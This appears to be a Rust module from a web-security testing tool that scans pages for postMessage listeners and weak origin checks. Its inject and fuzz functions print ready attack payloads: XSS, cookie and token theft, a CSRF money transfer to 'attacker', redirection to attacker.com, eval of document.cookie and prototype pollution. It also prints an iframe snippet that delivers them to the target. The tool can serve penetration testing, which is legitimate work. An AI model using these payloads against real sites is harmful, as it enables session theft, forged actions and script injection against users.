use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn origin(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} postMessage Origin Validation Bypass", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let body = resp.text().await?;

    let pm_patterns = ["postMessage", "addEventListener('message'", "addEventListener(\"message\"", "onmessage", "window.onmessage", ".origin", ".source", "event.origin", "e.origin"];
    let mut found = Vec::new();
    for p in &pm_patterns {
        if body.contains(p) { found.push(p.to_string()); }
    }

    if found.is_empty() {
        println!("  {} No postMessage usage detected.", "[-]".green().bold());
        return Ok(());
    }

    println!("  {} postMessage patterns found:", "[*]".cyan().bold());
    for p in &found { println!("    {} {}", "*".cyan(), p); }

    let bypasses = [
        ("Wildcard origin check", "event.origin === '*' || event.origin === ''"),
        ("Missing origin check", "addEventListener('message', function(e) { /* no origin check */ }"),
        ("Substring match", "event.origin.indexOf('target.com') > -1"),
        ("Protocol bypass", "event.origin.startsWith('http')"),
        ("Subdomain bypass", "event.origin.endsWith('.target.com')"),
        ("Null origin", "event.origin === 'null'"),
        ("Regex bypass", "event.origin.match(/target\\.com/)"),
        ("No source check", "e.source.postMessage(/* reply without verifying source */"),
    ];

    println!("\n  {} Origin bypass vectors:", "[*]".cyan().bold());
    for (name, pattern) in &bypasses {
        let detected = body.contains(pattern) || (pattern.contains("origin") && body.contains("origin") && !body.contains("=== 'https://"));
        let tag = if detected { "DETECTED".red().bold().to_string() } else { "not found".to_string() };
        println!("    {} {:30} {}", "*".cyan(), name, tag);
    }

    println!("\n{} Inject payloads via: window.postMessage(payload, '*')", "[*]".cyan().bold());
    Ok(())
}

pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} postMessage Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let payloads = [
        ("XSS via innerHTML", r#"{"action":"render","html":"<img src=x onerror=alert(1)>"}"#),
        ("Cookie exfil", r#"{"action":"getData","type":"cookies"}"#),
        ("CSRF trigger", r#"{"action":"submit","form":"transfer","to":"attacker","amount":"9999"}"#),
        ("Navigate", r#"{"action":"navigate","url":"https://attacker.com"}"#),
        ("Eval", r#"{"action":"eval","code":"document.cookie"}"#),
        ("Storage read", r#"{"action":"getStorage","key":"token"}"#),
        ("Storage write", r#"{"action":"setStorage","key":"token","value":"attacker_token"}"#),
        ("Fetch proxy", r#"{"action":"fetch","url":"/admin/api/users","method":"GET"}"#),
    ];

    println!("  {} Injection payloads (deliver via postMessage):", "[*]".cyan().bold());
    for (name, payload) in &payloads {
        println!("    {} {:25} {}", "*".cyan(), name, payload);
    }

    println!("\n  {} Delivery snippet:", "[*]".cyan().bold());
    println!("    let iframe = document.createElement('iframe');");
    println!("    iframe.src = '{}';", url);
    println!("    document.body.appendChild(iframe);");
    println!("    iframe.onload = () => iframe.contentWindow.postMessage(payload, '*');");
    Ok(())
}

pub async fn fuzz(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} postMessage Listener Fuzzer", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let body = resp.text().await?;

    let has_listener = body.contains("addEventListener('message'") || body.contains("addEventListener(\"message\"") || body.contains("onmessage");
    if !has_listener {
        println!("  {} No message listener found.", "[-]".yellow().bold());
        return Ok(());
    }

    let fuzz_types = [
        ("String payload", "\"ps_fuzz\""),
        ("JSON object", "{\"type\":\"ps_fuzz\",\"cmd\":\"test\"}"),
        ("Array", "[1,2,3,\"ps_fuzz\"]"),
        ("Number", "1337"),
        ("Boolean", "true"),
        ("Null", "null"),
        ("Nested JSON", "{\"action\":{\"type\":\"admin\",\"cmd\":\"exec\"}}"),
        ("Prototype", "{\"__proto__\":{\"isAdmin\":true}}"),
        ("Large string", &format!("\"{}\"", "A".repeat(10000))),
        ("Special chars", "\"<script>alert(1)</script>\""),
    ];

    println!("  {} Fuzz payloads to send via postMessage:", "[*]".cyan().bold());
    for (name, payload) in &fuzz_types {
        let preview = if payload.len() > 60 { format!("{}...", &payload[..60]) } else { payload.to_string() };
        println!("    {} {:25} {}", "*".cyan(), name, preview);
    }

    println!("\n  {} Look for: DOM changes, errors, network requests, storage modifications.", "[*]".cyan().bold());
    Ok(())
}

pub async fn chain(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Cross-Frame postMessage Chaining", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let body = resp.text().await?;

    let iframes_re = regex::Regex::new(r#"src=["']([^"']+)["']"#).ok();
    let mut iframes = Vec::new();
    if let Some(re) = iframes_re {
        for m in re.find_iter(&body) {
            if !m.as_str().contains("about:blank") {
                iframes.push(m.as_str().to_string());
            }
        }
    }

    if iframes.is_empty() {
        println!("  {} No iframes found for chaining.", "[-]".yellow().bold());
    } else {
        println!("  {} Iframes found (potential chain targets):", "[*]".cyan().bold());
        for iframe in &iframes {
            println!("    {} {}", "*".cyan(), iframe);
        }
    }

    let chain_patterns = [
        ("parent.postMessage", "Communicates with parent frame"),
        ("top.postMessage", "Communicates with top frame"),
        ("opener.postMessage", "Communicates with window.opener"),
        ("frames[", "Accesses frame by index"),
        ("contentWindow.postMessage", "Sends to child iframe"),
        ("window.open", "Opens new window for chaining"),
    ];

    let mut chains = Vec::new();
    for (pattern, desc) in &chain_patterns {
        if body.contains(pattern) {
            println!("  {} {:35} — {}", "[!]".red().bold(), pattern, desc);
            chains.push(pattern.to_string());
        }
    }

    if chains.is_empty() {
        println!("  {} No cross-frame communication patterns found.", "[-]".green().bold());
    } else {
        println!("\n{} {} chaining pattern(s) found — cross-frame attack possible.", "[!]".red().bold(), chains.len());
    }
    Ok(())
}
